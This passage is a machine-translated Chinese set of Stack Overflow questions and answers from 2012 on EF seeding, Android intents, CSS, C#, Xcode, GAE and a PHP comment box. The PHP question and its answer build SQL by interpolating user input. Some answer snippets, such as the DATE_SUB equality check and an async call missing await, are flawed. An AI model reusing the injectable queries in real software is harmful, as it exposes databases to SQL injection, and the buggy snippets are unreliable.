    public virtual CommentVote CommentVote { get; set; }
    public virtual ProjectCoverVote ProjectCoverVote { get; set; }
}
public class Comment
{
    [Key]
    public int CommentID { get; set; }
    public int ProjectDocID { get; set; }
    public int UserID { get; set; }

    public string Text { get; set; }
    public string Annotation { get; set; }
    public string Quote { get; set; }
    public string Start { get; set; }
    public string End { get; set; }
    public string StartOffset { get; set; }
    public string EndOffset { get; set; }
    public DateTime DateCreated { get; set; }

    public virtual ICollection<CommentVote> CommentVote { get; set; }
    public virtual ICollection<CommentReply> CommentReply { get; set; }

    public virtual ProjectDoc ProjectDoc { get; set; }
    public virtual User User { get; set; } 
} 
```

然后我将其用作实体代码第一次迁移中的种子方法的一部分：

```
 context.Users.AddOrUpdate(i => i.FirstName,
     new User { UserID = 1, FirstName = "Bob", LastName = "Dole", Email = "nobody@gmail.com", FacebookID = "123123124123", Admin = true, Authorized = true },
     new User { UserID = 2, FirstName = "Dale", LastName = "Dole", Email = "nobody@gmail.com", FacebookID = "123123124123", Admin = false, Authorized = true }
            );

context.Comments.AddOrUpdate(i => i.CommentID,
      new Comment { CommentID = 1, ProjectDocID = 1, UserID = 1, Text = "This is a comment", DateCreated = DateTime.Parse("Dec 03, 2011 12:00:00 PM") }
      ); 
```

这是我得到的错误。

```
System.Data.SqlClient.SqlException: 
The INSERT statement conflicted with the FOREIGN KEY constraint 
"FK_dbo.Comment_dbo.User_CommentID". The conflict occurred in database 
"TEST_ba6946e96d174b7bac9543ba614c8cf8", table "dbo.User", column 'UserID'. 
```

如果我注释掉添加注释行的尝试，它适用于具有 UserID 字段的我的 Projects 表。帮助？如果您发现任何不相关的错误或我应该知道的事情，请不要犹豫指出它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T04:18:06.810

这似乎是一系列问题的结果，从需要使用 fluent api 告诉它不要在删除时级联到将 User 类的虚拟属性设置为 ICollection<>。我也在使用类似的东西

```
 public virtual ProjectDoc ProjectDoc { get; set; } 
```

代替

```
 public ProjectDoc ProjectDoc { get; set; } 
```

不知道到底有什么区别，但它现在正在工作。

# android-intent - 如何将图像从一项活动传递到另一项活动？

> ID：13870621
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:52:08.477
> 
> 标签：android-intent

我正在尝试下面的代码将图像从一个活动传递到另一个活动。

```
 Bundle search_opt=new Bundle();
         search_opt.putByteArray("key1", image1);
        search_opt.putByteArray("key2", image2);
        search_opt.putByteArray("key3", image3);

        Intent view=new Intent(CameraOpen.this,insertion_db.class);
        view.putExtras(search_opt);
        startActivity(view); 
```

但我得到错误

```
 Bundle search_opt=new Bundle();
        error :Unreachable code 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:58:13.613

感谢您发布代码。

我将您之前使用的代码放入一个新项目中，并且（在添加了一些虚拟变量和类之后）它编译得很好，不会出现任何无法访问的代码错误。

所以我只能推测可能是什么问题。如果我将 case R.id.okImage 语句向下移动几行，这会使程序执行的正常流程无法到达 Bundle 行并给出无法访问的代码错误消息。我也可以通过注释掉 R.id.okImage 行来获得类似的信息。

```
// From the switch statement, program execution continues at either
// 1a) the case statement R.id.ibTakePic
// 1b) the case statement R.id.okImage
// 2a) a default statement (if you have entered one)
// 2b) or otherwise at the line following the switch
switch (v.getId()) {
    case R.id.ibTakePic:  // 1a
        for(int x=0;x<3;x++)
        {
            i=new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
            startActivityForResult(i,cameraData);
        }
        break;

        // Thus the program will never run this code as it is after the break from the
        // previous statement and before the case line below.
        // This is an example of unreachable code
        Bundle search_opt=new Bundle();
        search_opt.putByteArray("key1", image1);
        search_opt.putByteArray("key2", image2);
        search_opt.putByteArray("key3", image3);

    case R.id.okImage:  // 1b
        Intent view=new Intent();
        view.putExtras(search_opt);
        startActivity(view);
        break;
    }
    // 2b
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T20:36:11.037

我以前试过这个

> > @Override
> > public void onClick(View v) {
> 
> ```
>  switch (v.getId()){ 
> ```
> 
> > ```
> >  case R.id.ibTakePic:
> >      for(int x=0;x<3;x++)
> >        {
> >         i=new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
> >         startActivityForResult(i,cameraData);
> >        }
> >         break;
> >     case R.id.okImage:
> >         Bundle search_opt=new Bundle();
> >        search_opt.putByteArray("key1", image1);
> >        search_opt.putByteArray("key2", image2);
> >        search_opt.putByteArray("key3", image3);
> > 
> >        Intent view=new Intent(CameraOpen.this,insertion_db.class);
> >        view.putExtras(search_opt);
> >        startActivity(view);
> > 
> >         break;
> >     }
> > } 
> > ```
> > 
> > @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) {
> > 
> > > ```
> > >  super.onActivityResult(requestCode, resultCode, data);
> > > 
> > >   if(resultCode==RESULT_OK && counter==1 ){       
> > >                     Bundle extras=data.getExtras();
> > >                     bmp1=(Bitmap) extras.get("data");
> > >       iv1.setImageBitmap(bmp1);
> > >                     byte[] image1 =Utilities.getBytes(bmp1);
> > >                     counter++;  
> > >              }
> > > 
> > >   else if(resultCode==RESULT_OK && counter==2){
> > >                    Bundle extras=data.getExtras();
> > >                    bmp2=(Bitmap) extras.get("data");
> > >          iv2.setImageBitmap(bmp2);
> > >                    byte[] image2 =Utilities.getBytes(bmp2);
> > >                    counter++;
> > >   }
> > >             else if(resultCode==RESULT_OK && counter==3){
> > >                   Bundle extras=data.getExtras();
> > >                   bmp3=(Bitmap) extras.get("data");
> > >         iv3.setImageBitmap(bmp3);
> > >                   byte[] image3 = Utilities.getBytes(bmp3);
> > >               } } } 
> > > ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T20:49:30.163

现在通过这样做它可以工作

> > ```
> >  case R.id.okImage:
> >         startother();
> >         break;
> >     }
> > }
> > 
> > private void startother() {         
> > 
> >     Intent view=new Intent(CameraOpen.this,insertion_db.class);
> >     view.putExtras(search_opt);
> >     startActivity(view);    
> >    }
> > 
> > @Override 
> > ```
> > 
> > protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data);
> > 
> > ```
> >  if(resultCode==RESULT_OK && counter==1 ){
> >                     Bundle extras=data.getExtras();
> >                     bmp1=(Bitmap) extras.get("data");
> >         iv1.setImageBitmap(bmp1);
> >                     byte[] image1 =Utilities.getBytes(bmp1);                       
> >                     search_opt.putByteArray("key1", image1);
> >         counter++; 
> >              }
> > 
> >     else if(resultCode==RESULT_OK && counter==2){
> >                     Bundle extras=data.getExtras();
> >                     bmp2=(Bitmap) extras.get("data");
> >         iv2.setImageBitmap(bmp2);
> >                     byte[] image2 =Utilities.getBytes(bmp2);               
> >                     search_opt.putByteArray("key2", image2);
> >         counter++;
> >     }       
> >            else if(resultCode==RESULT_OK && counter==3){  
> >                 Bundle extras=data.getExtras(); 
> >                 bmp3=(Bitmap) extras.get("data");
> >             iv3.setImageBitmap(bmp3);   
> >                 byte[] image3 =Utilities.getBytes(bmp3);
> >         search_opt.putByteArray("key3", image3); } 
> > ```
> > 
> > }
> > }

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T20:54:38.900

您可以将图像保存到磁盘并将路径/文件名作为字符串传递给其他活动，而不是传递图像。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-09-19T11:41:18.833

将图像从一个意图传递到另一个意图的简单方法。首先`activity.java`：

```
intent.putExtra("resId", R.drawable.image);                                 
startActivity(intent);                                                         
Bundle bundle = getIntent().getExtras();                                       
if (bundle != null) {                                                          
    int resId = bundle.getInt("resId");                                        
    imageView.setImageResource(resId);                                         
} 
```

# css - 没有为图像精灵加载背景文件

> ID：13870624
> 
> 赞同：0
> 
> 时间：2012-12-13T23:52:28.460
> 
> 标签：css, image, sprite

我为我的网站创建了一个照片库，在我的最新网站上，我认为我会将 CSS 和所有页面文件包含在一个名为“gallery”的子文件夹中，我认为这会更容易，因为我可以像插件一样使用它 -在其他网站上。

这是画廊页面：[http ://unserclosecustoms.com/gallery/gallery.php](http://unserclosecustoms.com/gallery/galleries.php)

新问题与我在 photo.php 页面上用于导航图形的图像精灵有关。这是您一次滚动浏览大尺寸图像的页面。

这是照片页面的示例链接：[http ://unserclosecustoms.com/gallery/photo.php?curPage=12&g=33&t=19](http://unserclosecustoms.com/gallery/photo.php?curPage=12&g=33&t=19)

sprite 文件gallerylinks.png 位于站点根目录中名为“graphics”的文件夹中。我决定更改精灵文件的位置并将其放在名为“graphics”的文件夹中的“gallery”文件夹中。我在我的 CSS 文件中更改`background`了画廊的路径，当我尝试它时……没有图像精灵。我逐个字母地检查了路径中的拼写十几次，但仍然没有运气。

当我将 CSS 文件中的路径更改回根目录中的“图形”文件夹时，它工作正常。我不知道为什么更改精灵文件的位置（以及`background`CSS 中的适当路径）会有所不同。我在 Firefox 17（我的主浏览器）和 Chrome 23 中检查了这一点，结果相同，所以我认为这不是浏览器问题。

我可以在当前位置使用 sprite 文件，但我宁愿将它放在“gallery”文件夹内的“graphics”文件夹中。任何和所有的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:14:39.133

我同意上述重新使用虚拟路径而不是相对路径。通过这种方式，您将消除很多头痛。

如果没有看到页面处于非工作形式，就很难解决这个问题。然而，我最好的猜测是，它可能与移动文件和移动图像有关，并且您的相对路径被破坏了。

我是否正确阅读了上述内容，并且您试图将您的页面放在 /gallery/photo.php 并将图像放在 /gallery/graphics/gallerylinks.png？如果是这种情况，相对于页面，正确的 rel 路径将是 ../graphics/gallerylinks.png。

不过，再一次，省去所有这些不必要的麻烦，并遵循使用虚拟路径作为规则的建议——然后当你决定移动页面时，生活仍然很好，因为你总是从根开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:05:12.660

看看是否可以避免相对于 CSS 文件所在位置的路径：

```
#back a:hover {
   background: url(../../graphics/gallerylinks.png) -160px -30px;
} 
```

而是使用带前导的根路径`/`（移动文件后）：

```
#back a:hover {
   background: url(/gallery/graphics/gallerylinks.png) -160px -30px;
} 
```

# css - 来自 Android XML 布局，如何在 XHTML 中放置网页元素？

> ID：13870625
> 
> 赞同：8
> 
> 时间：2012-12-13T23:52:28.360
> 
> 标签：css, xhtml

我主要是一名 Android 开发人员，但我对使用 CSS 为这些页面设置样式的 XHTML 创建网页非常感兴趣。我想做一个简单的网页布局，由三行组成，中间行有三列。在 Android XML 中，我会这样做（大致）：

```
<LinearLayout orientation:vertical> (parent)
----<LinearLayout orientation: horizontal>
----<LinearLayout orientation: horizontal>
--------<LinearLayout orientation: vertical>
--------<LinearLayout orientation: vertical>
--------<LinearLayout orientation: vertical>
----<LinearLayout orientation: horizontal> 
```

这将创建一个看起来像这样的布局：

```
-----------------------------------------------
|                                             |
-----------------------------------------------
|             |                   |           |
-----------------------------------------------
|                                             |
----------------------------------------------- 
```

我对 XHTML 和 CSS 还是有点陌生​​（尽管我已经掌握了基础知识），虽然我学得很快，但我还没有找到任何针对 Android 开发人员的网页布局设计教程。如果有人可以解释实现我想要的布局的好方法，我将不胜感激。

TLDR：如何使用 XHTML 和/或 CSS 制作由三行组成的网站布局，中间行有三列？

非常感谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-14T00:02:58.683

这可能是您应该通过教程学习的东西，但这是您所要求的近似值。 [http://jsfiddle.net/7LYhu/](http://jsfiddle.net/7LYhu/)

### HTML

```
<div class="row"> Row
</div>

<div class="row">
  <div class="col">
  Column
    </div>
  <div class="col">
      Column
  </div>
  <div class="col">
      Column
  </div>
</div>

<div class="row">
    Row
</div>​ 
```

### CSS

```
.row {
      width: 80%;
      background: gray;
      text-align: center;
    }
.col {
      width: 33.3%;
      float: left;
      background: orange;
}​ 
```

# html - img 元素上的 :before 和 :after 元素

> ID：13870635
> 
> 赞同：0
> 
> 时间：2012-12-13T23:52:54.413
> 
> 标签：html, css, sass

是否可以在 img 元素上使用伪选择器之前和之后？认为这是但没有任何运气，将css切换到div并且它工作正常。类`.page-overhang`是 img 元素。

```
// page overhang mixin
@mixin overhang {
    &:before,
    &:after {
        position: absolute;
        left: 0;
        display: block;
        width: 10px;
        height: 18px;
        background: url(../images/sprite.png) no-repeat;
        content: "";
    }

    &:before {
        top: -18px;
        background-position: 0 -100px;
    }

    &:after {
        bottom: -18px;
        background-position: 0 -119px;
    }
}

/* scss file */
.page-overhang {
    position: relative;
    display: block;
    @include overhang();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:57:02.163

`:before`和`:after`伪元素不能用于[void 元素](http://www.w3.org/TR/html-markup/syntax.html#void-element)，因为它们指定要附加或附加到元素实际内容的内容，而 void 元素可以没有内容。

# actionscript-3 - 获取 Adob e AIR Mobile 中软键盘的高度

> ID：13870645
> 
> 赞同：9
> 
> 时间：2012-12-13T23:54:50.873
> 
> 标签：actionscript-3, apache-flex, air

我们正在尝试规划一个将部署到 Android 和 iOS 的移动 AIR 应用程序。我们的设计团队返回的屏幕之一是从屏幕顶部到键盘的全屏文本编辑器。如果我不能以编程方式获取键盘的高度，我显然无法做到这一点。有没有办法做到这一点？

我知道这在 iOS 中是可能的，而在 Android 中似乎是不可能的。创建 ANE 来执行此操作没有问题，但如果数据已在 AIR 中可用，我宁愿避免使用它。或者，我可以假设键盘是屏幕大小的 1/2，这在大多数情况下都可以在 iOS 上正常工作。

简而言之，是否可以在 AIR 中获得软键盘的高度？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-14T04:49:19.183

我相信您可以使用舞台类访问它。看看`this.stage.softKeyboardRect`你的观点。

注意：我没有亲自尝试过，但您可能需要在软键盘事件后访问它。在 上为您的文本输入添加一个事件侦听器`softKeyboardActivate`，然后调用`this.stage.softKeyboardRect`以获取键盘的高度和位置。

# c# - 带有 AWAIT 的 Windows Phone 8 异步 JSON

> ID：13870649
> 
> 赞同：1
> 
> 时间：2012-12-13T23:55:15.730
> 
> 标签：c#, asynchronous, windows-phone-8, async-await

我正在尝试为 Windows Phone 8 编写一个库，并且想知道是否可以使用 await 关键字在不使用回调的情况下使用 JSON？还是我误解了它的工作原理？

本质上，我希望应用程序能够说：

```
string result = Library.Ping(var1, var2); 
```

该库连接到 Web 服务并将内容从 JSON 反序列化为动态对象。然后它将它返回给已将请求发送到库的主应用程序。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T00:27:03.367

如果网站出现故障，请参阅链接答案：

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;

namespace Win8WinPhone.CodeShare.Extensions
{
    public static class HttpExtensions
    {
        public static Task<Stream> GetRequestStreamAsync(this HttpWebRequest request)
        {
            var taskComplete = new TaskCompletionSource<Stream>();
            request.BeginGetRequestStream(ar =>
            {
                Stream requestStream = request.EndGetRequestStream(ar);
                taskComplete.TrySetResult(requestStream);
            }, request);
            return taskComplete.Task;
        }

        public static Task<HttpWebResponse> GetResponseAsync(this HttpWebRequest request)
        {
            var taskComplete = new TaskCompletionSource<HttpWebResponse>();
            request.BeginGetResponse(asyncResponse =>
            {
                try
                {
                    HttpWebRequest responseRequest = (HttpWebRequest)asyncResponse.AsyncState;
                    HttpWebResponse someResponse = (HttpWebResponse)responseRequest.EndGetResponse(asyncResponse);
                    taskComplete.TrySetResult(someResponse);
                }
                catch (WebException webExc)
                {
                    HttpWebResponse failedResponse = (HttpWebResponse)webExc.Response;
                    taskComplete.TrySetResult(failedResponse);
                }
            }, request);
            return taskComplete.Task;
        }
    }

    public static class HttpMethod
    {
        public static string Head { get{return "HEAD";} }
        public static string Post { get{return "POST";} }
        public static string Put { get{return "PUT";} }
        public static string Get { get{return "GET";} }
        public static string Delete { get{return "DELETE";} }
        public static string Trace { get{return "TRACE";} }
        public static string Options { get{return "OPTIONS";} }
        public static string Connect { get{return "CONNECT";} }
        public static string Patch { get{return "PATCH";} }
    }

} 
```

然后你可以把你的函数写成：

```
public async Task<string> GetMyData(string urlToCall) 
{
    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlToCall);
    request.Method = HttpMethod.Get;
    HttpWebResponse response = (HttpWebResponse)await request.GetResponseAsync();
    using (var sr = new StreamReader(response.GetResponseStream())) 
    { 
        return sr.ReadToEnd(); 
    } 
} 
```

然后将其称为：

```
Tweet myTweet = await GetTweet(tweetID); 
```

所有功劳归于：@robertftw 谁链接到： http: [//www.windowsphonegeek.com/news/windows-8---windows-phone-code-sharing-httpwebrequest-getresponseasync](http://www.windowsphonegeek.com/news/windows-8---windows-phone-code-sharing-httpwebrequest-getresponseasync)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-14T02:15:53.473

你可以非常接近那个。你最终得到的是：

```
 string result = await Library.PingAsync(var1, var2); 
```

首先，安装[Microsoft.Bcl.Async](https://nuget.org/packages/Microsoft.Bcl.Async)。你`Library.PingAsync`会有这种结构：

```
 public static async Task<string> PingAsync(MyType1 var1, MyType2 var2)
 {
   var client = new WebClient();
   var stringResult = client.DownloadStringTaskAsync(..);
   return JSON.Parse(stringResult).Whatever;
 } 
```

# c# - 从表单访问 main 中的实例

> ID：13870651
> 
> 赞同：0
> 
> 时间：2012-12-13T23:55:20.710
> 
> 标签：c#, forms, class, instance

/* 嗨，我正在尝试在 Visual Studio 上制作我的第一个 c# 应用程序。我在 main 中创建了一个类和该类的一个实例，我只是想在表单上的单击事件中查询该实例的成员，但它告诉我实例名称在当前上下文中不存在。任何帮助将不胜感激这是我的代码。*/

```
 using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Windows.Forms;

    namespace WindowsFormsApplication10
    {

     public class character         // this is my class
        {
            public bool hair_black;
        }

        static class Program
        {
            /// <summary>
            /// The main entry point for the application.
            /// </summary>
            [STAThread]
            static void Main()
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1());

                character deviljin = new character();  // instance of my class

                deviljin.hair_black = true;      // initiating a member of the instance

            }
        }
    }

    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Drawing;
    using System.Linq;
    using System.Text;
    using System.Windows.Forms;

    namespace WindowsFormsApplication10
    {

        public partial class Form1 : Form
        {

            int cs1 = 0,cs2=0;

            public Form1()
            {
                InitializeComponent();

            public void pictureBox1_Click(object sender, EventArgs e)
            {

                flowLayoutPanel1.Visible = true;
                if (deviljin.hair_black == true)   // trying to access instance member
                {                                  // but getting deviljin does not
                                                   // exist in the current context
                    pictureBox28.Visible = false;
                }            

            }

        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:09:39.353

这是因为错误所说的 - 实例在当前上下文（表单的上下文）中不存在

`Main`这是一个范围问题 - 您声明的每个变量都有一个范围，并且由于您在类中方法的本地范围内声明您的字符类实例`Program`，因此它只能在该方法中可见。

由于`Program`该类是静态的，因此您可以在该类上创建一个静态成员，例如：

```
namespace WindowsFormsApplication10
{

 public class character         // this is my class
    {
        public bool hair_black;
    }

    static class Program
    {
        public static character deviljin;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false); 
```

**编辑：**并没有真正注意到这一点，但正如史蒂夫指出的那样，虽然这会编译，但如果您在实例化变量之前调用 Application.Run ，您将在尝试访问它时获得运行时异常（它将为空）所以 make确保在 Application.Run 之前执行此操作

```
 deviljin = new character();  // instance of my class

            deviljin.hair_black = true;      // initiating a member of the instance

            Application.Run(new Form1());

        }
    }
} 
```

这样您就可以通过`Program`类访问您的实例：

```
 public void pictureBox1_Click(object sender, EventArgs e)
        {

            flowLayoutPanel1.Visible = true;
            if (Program.deviljin.hair_black == true)   
            { 
                pictureBox28.Visible = false;
            }            

        } 
```

阅读变量范围、访问修饰符和静态/实例变量——对于一个非常简单的项目，静态变量可以，所以你可以在学习的同时走这条路

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T00:12:33.673

您需要更新您的表单以将 Character 实例作为参数，例如

```
public partial class Form1 : Form
{
    private Character _character;
    public Form1(Character character)
    {
        _character = character;
    }

    public void pictureBox1_Click(object sender, EventArgs e)
    {
        If (_character.hair_black)
        {
             ...
        }
    }
}
...
var deviljin = new Character()
{
    hair_black = true
};
Application.Run(new Form1(deviljin)); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T00:03:36.707

您的实例变量`deviljin`是主方法的本地变量，不能在该方法之外直接引用。

您需要在您尝试使用它的 Form1 实例中传递引用。这可以通过 form1 的构造函数直接传递引用来完成

```
 Application.Run(new Form1(deviljin)); 
```

当然将 Form1 的构造函数更改为

```
private character _devReferenceToCharacterPassed

public Form1(character mycharInstance)
{
    _devReferenceToCharacterPassed = mycharInstance;
    InitializeComponent();
} 
```

现在您可以在点击代码中使用传入的实例

```
public void pictureBox1_Click(object sender, EventArgs e)
{
    flowLayoutPanel1.Visible = true;
    if (_devReferenceToCharacterPassed.hair_black == true)   
    {                                  
         pictureBox28.Visible = false;
    }            
} 
```

还要注意

> Application.Run(new Form1(deviljin));

是阻塞调用。这意味着您的代码在 Form1 打开之前不会退出此调用，因此您需要`deviljin`在 Run 调用之前移动变量的创建。

编辑：我强烈反对在应用程序中使用具有全局可见性的变量。有时它们是必要的，但它们会很快导致创建不可维护的代码。最好学习使用尽可能少的全局变量进行编程

# xcode - 由于与 UserInterfaceState.xcuserstate 冲突而无法合并

> ID：13870652
> 
> 赞同：13
> 
> 时间：2012-12-13T23:55:27.570
> 
> 标签：xcode, commit, merge-conflict-resolution

我创建了一个分支并进行了一系列更改。我提交了更改，然后将更改存档。然后我切换到主分支并尝试进行合并。它说我有未提交的更改。所以我在 master 分支上做了一个提交，看看它在说什么。它说有一个名为 UserInterfaceState.xcuserstate 的文件被修改。所以我提交了更改（不确定更改是什么）。然后我再次尝试合并。然后它会打开一个合并窗口并指示与 UserInterfaceState.xcuserstate 存在冲突。所以我回到分支，发现现在需要提交同一个文件。这以前没有出现过。所以我提交了它并回到了主分支。我再次尝试合并，但由于未提交的更改而无法合并。果然，UserInterfaceState。xcuserstate 再次需要提交。我提交并尝试合并。冲突的同样问题。这是一个恶性循环。

该文件是什么以及如何解决报告的冲突。它没有显示在我的项目导航窗口中。此外，它不在 unix 文件系统中。我完全被困住了。建议？我正在使用 xcode 4.5.2

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2014-07-07T13:00:00.877

只需使用删除文件

git rm --cached *xcuserstate

然后选择带有杂项消息的 .DS_Store 进行本地提交

放弃所有其他更改

拉

推

完毕 ：）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-14T00:08:24.133

`UserInterfaceState.xcuserstate`是 Xcode 保存 GUI 状态的地方，例如窗口位置、打开的选项卡、项目检查器中的扩展节点等。

简单地调整 Xcode 窗口的大小将导致该文件发生更改并被您的源代码控制系统标记为已修改。您可以让您的 SCM 系统忽略对项目本身不重要的特定文件。

Git：[Xcode 项目的 Git 忽略文件](https://stackoverflow.com/questions/49478/git-ignore-file-for-xcode-projects)
Subversion：[SVN 忽略模式与 Xcode 4](https://stackoverflow.com/questions/6474523/svn-ignore-pattern-with-xcode-4)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-01-22T05:43:28.753

我尝试了所有命令对我没有帮助。所以我想在目录中删除。

**右键单击xcode项目文件->显示包内容-> project.xcworkspace->右键单击xcworkspace文件->显示包内容-> xcuserdata-> mac"mac is an system name".xcuserdatad -> UserInterfaceState.xcuserstate ->在这里删除您的头疼我的意思是 UserInterfaceState.xcuserstate 文件。**

然后使用命令提交并照常执行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-30T17:02:16.203

在 CMD 下简单运行-

git rm --cached [在此处输入您的 UserInterfaceState.xcuserstate 路径，您可以从终端警告中复制并粘贴路径]

就像我的情况一样：

git rm --cached CabAppUser.xcworkspace/xcuserdata/shinewebsolutions.xcuserdatad/UserInterfaceState.xcuserstate

谢谢

# java - 工作簿和 Oracle B2B 标注

> ID：13870655
> 
> 赞同：1
> 
> 时间：2012-12-13T23:55:50.063
> 
> 标签：java, apache-poi, b2b, oracle-soa

我需要将 xml 数据转换为 Excel 文件。当我写入文件时，我的代码可以正常工作，但是，当我尝试写入输出流时，代码不起作用。

我要做的就是使用 Apache POI 类创建一个 excel 文件，并将其写入输出流并将其传递回 Oracle B2B，这将在 SFTP 服务器中创建一个 excel 文件。

下面的代码工作得很好，（写入文件，使用 FileOutPutStream）

```
 FileOutputStream output1 =
            new FileOutputStream(new File("C:\\Oracle\\Middleware\\home_11gR1\\user_projects\\domains\\mysoa_domain\\dsp\\PO_1234.xls"));
        workbook.write(output1); 
```

下面的代码不起作用，

```
 workbook.write((ByteArrayOutputStream)output); 
```

我不确定这里会有什么问题。非常感谢任何想法和建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:11:05.033

尝试关闭流。也许如果你让它打开，写入的信息将不会被刷新。

还可以考虑[为您的 IO 使用缓冲流](http://docs.oracle.com/javase/tutorial/essential/io/buffers.html)

# google-app-engine - 图像由 localhost 提供，但在我部署时不提供

> ID：13870656
> 
> 赞同：3
> 
> 时间：2012-12-13T23:56:07.300
> 
> 标签：google-app-engine

我一直在开发 GAE 应用程序，我一直在本地引用图像，但是当我部署应用程序时，图像丢失了！！我正在使用 Windows Vista，FWIW。这是我的 app.yaml：

```
application: pll3rdorder
version: 1
runtime: python27
api_version: 1
threadsafe: yes

handlers:
- url: /favicon\.ico
  static_files: favicon.ico
  upload: favicon\.ico

- url: /static
  static_dir: static

- url: /download/noiseSources
  script: downloadNoiseSources.app

- url: /stylesheets
  static_dir: stylesheets

- url: .*
  script: main.app

libraries:
- name: webapp2
  version: "2.5.1"
- name: numpy
  version: "1.6.1"
- name: jinja2
  version: "2.6" 
```

我指的是这样的图像：

```
<img type="image/png" class="image" src="/static/PLL_diagram2_small.png" /> 
```

出于*某种*原因，它可以在本地工作，但是当我部署时，该图像没有显示出来！

我也在使用 CSS 样式表，并且在本地和部署时都可以使用：

```
<link rel="stylesheet" type="text/css" href="/stylesheets/style.css" /> 
```

样式表和图像都是静态文件，那么为什么它适用于一个而不适用于另一个呢？我希望有人能照亮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:17:52.180

确保文件名`PLL_diagram2_small.png`与您的网址完全匹配。

当您说该映像在您的 Windows 机器上工作但在部署版本中不工作时——考虑到文件名包含大写和小写字母——很可能是文件名大小写有问题。

在您的 Windows 机器上，您的文件系统可能不区分大小写，因此它不会识别文件名中的大小写错误。

部署系统似乎更严格，这里。

无论如何，您只提供有关实际错误的少量信息。也许，您可以说明服务器是否为您提供例如 404 或提供到有问题的站点的链接（如果它可供公众使用）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-13T18:36:48.980

对我来说，问题在于文件名格式。我有图像文件`equityLogo4.png`，但图像没有显示在服务器上。我将文件名格式更改为`equity-logo.png`并解决了问题。

# css - 为什么 css 变换旋转会使文本难看

> ID：13870660
> 
> 赞同：10
> 
> 时间：2012-12-13T23:56:39.893
> 
> 标签：css, transform, antialiasing

某些浏览器（对我来说：XP 上的 firefox 和 chrome）似乎没有对带有 CSS 旋转的文本应用抗锯齿

示例：http : [//dabblet.com/gist/4281185](http://dabblet.com/gist/4281185)

为什么它们适用于图像而不适用于文本？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T10:48:03.880

使用 3D 变换。使用 3D 变换属性，即使您实际上没有进行任何 3D 变换也可以提高性能，如下所示：

1.  它将启动 ol' GPU 并获得更流畅的性能。
2.  它会在按钮的默认状态下对文本进行处理（变薄），所以当转换开始时这并不奇怪。

WebKit 有一个讨厌的（我称之为错误），其中正在转换/转换的文本看起来很薄而且很糟糕。默认情况下，文本看起来不错，但当按钮处于过渡或变形时，您会闪烁和变细。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:28:08.070

糟糕的文本质量显然是您使用的网络浏览器的“故障”，但您应该等待一段时间，它应该被修复。随着 Web 开发人员学习如何使用新功能，浏览器程序员必须实现它们，而这需要一些时间才能正常工作。在浏览器的下一个版本中检查它 - 如果文本旋转会越来越多，越来越流行的浏览器会更好地处理它，以正确显示更多网页。

# php - mysql插入时间

> ID：13870675
> 
> 赞同：-3
> 
> 时间：2012-12-13T23:58:13.333
> 
> 标签：php, mysql, database, time

我正在做一个评论框。但我希望当人们点击提交评论时，他们会与我记录的其他信息一起登录 mysql。这是我使用的代码：

```
if(isset($_POST['btnRegister'])) //===When I will Set the Button to 1 or Press Button to register
{
$query = mysql_query("SELECT * FROM comment WHERE username='$username'");
if(mysql_num_rows($query) > 5 ){
echo "Slow down! you can only send 5 comments a day";

}else{

mysql_query ("insert into comment(username,comment)values('$username','$comment')");
header('location: succes_comment.php');
}
}
?> 
```

因此，如果用户单击它，则 mysql 时间冒号得到用户名、评论和他发送评论的时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:09:23.930

您需要在数据库中添加日期时间列。让我们将其命名为 'time_posted' 然后，当您插入一行时，您会这样做：

```
 insert into comment(username,comment, time_posted)values('$username','$comment', NOW()) 
```

当您检查用户最多提交时，让我们在一分钟内说 1 条评论，您这样做：

```
 SELECT username FROM comment WHERE username='$username' and time_posted = DATE_SUB(NOW(), INTERVAL 1 MINUTE) 
```

所以你会得到他在最后一分钟发布的消息数量，这样你就可以阻止他发布更多消息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:12:14.160

跑：

```
ALTER TABLE `comment`
